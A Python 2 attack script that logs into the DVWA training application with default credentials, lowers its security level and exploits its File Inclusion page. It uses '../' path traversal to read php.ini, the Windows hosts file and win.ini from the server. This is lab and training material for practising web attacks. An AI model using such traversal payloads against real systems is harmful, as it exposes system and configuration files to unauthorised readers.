#!/usr/bin/env python


import mechanize
import urllib2
import sys
import time
from time import ctime
from rainbow import colors
from bs4 import BeautifulSoup
import os


respo = 200

if len(sys.argv) != 3:

	print colors.RED + "\n[!] Usage: [IP] [Level]" + colors.END
	print colors.B_WHITE+ "[!] The default password for the first time is: " + colors.RED + "password" + colors.END
	sys.exit()


url = "http://"+sys.argv[1]+"/dvwa/login.php"
path = "/dvwa/"
vuln = "vulnerabilities/"
fi = "fi/"
param = "?page="
username = "admin"
password = "password"
levels = ['high', 'medium', 'low']
#unpack tuple
high, medium, low = levels

fetch = mechanize.Browser()


def CheckLog():

	print colors.CYAN + '''
		 ____  _____ ___ 
		|  _ \|  ___|_ _|
		| |_) | |_   | | 
		|  _ <|  _|  | | 
		|_| \_\_|   |___|
		                 

	  Author: Reznov - Pentester and hacker
	  Website: http://xakepu.blogspot.com
	  Github: https://github.com/reznov11
	  Twitter: @pentester11  ''' + colors.END


  	try:

		link = urllib2.urlopen(url)
	
		if link.code == respo:
			
			print "\n[--] %s, Response: %s"%(url,str(respo))
			time.sleep(1)
			return
		
		else:
			
			print "\n[!] Can't open the link !!" %(str(link.code))
			time.sleep(1)
			exit(0)

	except urllib2.HTTPError, error:
		
		print "\n[!] Please check the link !"
		exit(0)

	except urllib2.URLError, error:
		
		print colors.RED_HL + "\n[!] Can't resolve the host at this moment !!" + colors.END
		exit(0)


def main():

	fetch.open(url)
	fetch.select_form(nr=0)
	fetch.form['username'] = username
	fetch.form['password'] = password
	fetch.submit()

	if "Welcome" in fetch.title():
		print colors.YELLOW + "\n[*] " + fetch.title() + colors.END
		time.sleep(1)

	else:
		print colors.RED + "\n[!] " + colors.END + "Check the username or password !!"
		exit(0)

	print "\n[?] Enter the security panel"
	time.sleep(2)

	new = fetch.click_link(text='DVWA Security')
	fetch.open(new)

	print colors.YELLOW + "\n[!] You're inside the security panel > " + fetch.title() + colors.END
	time.sleep(2)

	changeSec = "\n[+] Now change the security level to " + colors.RED + "%s"%sys.argv[2] + colors.END

	print changeSec
	time.sleep(2)

	try:

		fetch.select_form(nr=0)
		new1 = fetch.form['security'] = [sys.argv[2]]
		new2 = fetch.form['security']

		fetch.submit()
		print "\n[*] Security now is: " + colors.RED + " ,".join(new2) + colors.END
		time.sleep(1)

		if new2 == high:
			print colors.RED + "\n[!] " + colors.END + "Security Level Is High !!!"
			exit(0)

	except mechanize._form.ItemNotFoundError:
		print "\n[+] Please choose one of these levels > " + colors.MAGENTA_HL +\
		 ", ".join(levels) + colors.END
		exit(0)

	print colors.B_WHITE + "\n[--] Now time to read some critical informations from %s"%sys.argv[1] +\
	 colors.END
	time.sleep(3)

	new3 = fetch.click_link(text='File Inclusion')
	fetch.open(new3)
	bs = BeautifulSoup(fetch.response().read())
	successMessage = colors.RED + "\n[+] " + colors.END + bs.findAll('h1')[0].getText()
	print successMessage
	time.sleep(1.5)

	menuWin = {}
	selections = True


	# considering that your dvwa running on windows this menu will do the job
	
	try:
		print "\n[--] Which file you'd like to read ??"
		print "\n"
		time.sleep(1)

		menuWin[1] = colors.B_WHITE + "Dvwa php.ini file" + colors.END
		menuWin[2] = colors.B_WHITE + "Read hosts file" + colors.END
		menuWin[3] = colors.B_WHITE + "Read win.ini file" + colors.END
		menuWin[4] = colors.B_WHITE + "Exit" + colors.END

		while True:

			for entry in menuWin:
				print entry, menuWin[entry]

			selections = input(colors.B_WHITE + "Please Select: " + colors.END)
			print "\n"

			if selections == 1:

				link1 = "http://" + sys.argv[1] + path + vuln + fi + param
				direc1 = link1 + "../../../../../../xampp/htdocs/dvwa/php.ini"
				res1 = fetch.open(direc1)
				bs1 = BeautifulSoup(fetch.response().read())

				inp = raw_input("Do you want to save results into a file y|n: ")
				
				if inp.lower() == 'y':
					
					bs1 = BeautifulSoup(fetch.response().read())
					filename = "php-ini.txt"
					text = open(filename, 'w')
					text.write(bs1.html.next.next.next)
					
					print colors.B_WHITE + "\n[*] " + colors.END + "%s created .\n" %filename
					time.sleep(1)
					text.close()

				elif inp.lower() == 'n':

					bs1 = BeautifulSoup(fetch.response().read())
					print bs1.html.next.next.next

			if selections == 2:
				
				link2 = "http://" + sys.argv[1] + path + vuln + fi + param
				direc2 = link2 + "../../../../../../windows/system32/drivers/etc/hosts"
				res2 = fetch.open(direc2)
				bs2 = BeautifulSoup(fetch.response().read())

				inp = raw_input("Do you want to save results into a file y|n: ")
				
				if inp.lower() == 'y':
					
					bs2 = BeautifulSoup(fetch.response().read())
					filename = "hosts.txt"
					text = open(filename, 'w')
					text.write(bs2.html.next.next.next)
					
					print colors.B_WHITE + "\n[*] " + colors.END + "%s created .\n" %filename
					time.sleep(1)
					text.close()
				
				elif inp.lower() == 'n':

					bs2 = BeautifulSoup(fetch.response().read())
					print bs2.html.next.next.next

			if selections == 3:
				
				link3 = "http://" + sys.argv[1] + path + vuln + fi + param
				direc3 = link3 + "../../../../../../windows/win.ini"
				res3 = fetch.open(direc3)

				inp = raw_input("Do you want to save results into a file y|n: ")
				
				if inp.lower() == 'y':
					
					bs3 = BeautifulSoup(fetch.response().read())
					filename = 'win.txt'
					text = open(filename, 'w')
					text.write(bs3.html.next.next.next)

					print colors.B_WHITE + "\n[*] " + colors.END + "%s created .\n" %filename
					time.sleep(1)
					text.close()

				elif inp.lower() == 'n':

					bs3 = BeautifulSoup(fetch.response().read())
					print bs3.html.next.next.next

			elif selections == 4:
				break

	except Exception, e:
		print e


if __name__ == "__main__":

	try:

		CheckLog()
		main()
		time.sleep(2)
		print colors.B_RED + "[X]", ctime() + colors.END

	except KeyboardInterrupt :
		print colors.RED + "\n[-] You closed the tool !!!" + colors.END
